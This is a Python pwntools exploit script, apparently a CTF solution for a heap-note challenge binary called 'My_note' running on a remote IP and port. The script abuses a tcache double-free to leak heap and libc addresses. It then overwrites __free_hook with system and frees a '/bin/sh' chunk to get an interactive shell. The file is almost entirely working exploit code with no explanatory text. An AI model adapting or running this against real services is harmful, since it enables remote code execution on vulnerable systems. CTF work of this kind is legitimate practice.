# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
import galatea 
context.log_level = 'debug' 
binary = './My_note'
elf = ELF('./My_note')
libc = ELF("./libc-2.27.so")
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = '47.99.38.177'
    port = '10001'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def cmd(choice):
    sla(":",choice)

def add(size,content="aaa"):
    cmd(1)
    sla(":",size)
    sa(":",content)


def show(id):
    cmd(2)
    sla(":",id)

def delete(id):
    cmd(3)
    sla(":",id)

one_gad = [0x4f2c5,0x4f322,0x10a38c]

add(0x90) #0
add(0x90)
add(0x90)
add(0x80,"/bin/sh\x00\x00")

for i in range(7):
    delete(0)

delete(1)

show(0)
ru("Content: ")
leak_heap =  u64(p.recv(6).ljust(8,"\x00"))

lg("leak_heap",leak_heap)

show(1)
ru("Content: ")
leak_libc = l64() - 0x70

libc_base =leak_libc - libc.sym["__malloc_hook"]

__free_hook =libc_base + libc.sym["__free_hook"]

system =libc_base + libc.sym["system"]

one_gadget = one_gad[0]+libc_base

lg("leak_libc",leak_libc)
lg("libc_base",libc_base)
lg("__free_hook",__free_hook)
lg("system",system)

add(0x90,p64(__free_hook))
add(0x90,"a")
add(0x90,p64(system))

delete(3)

#dbg()


p.interactive()

'''
@File    :   My_note.py
@Time    :   2021/07/04 22:40:06
@Author  :   Niyah 
'''
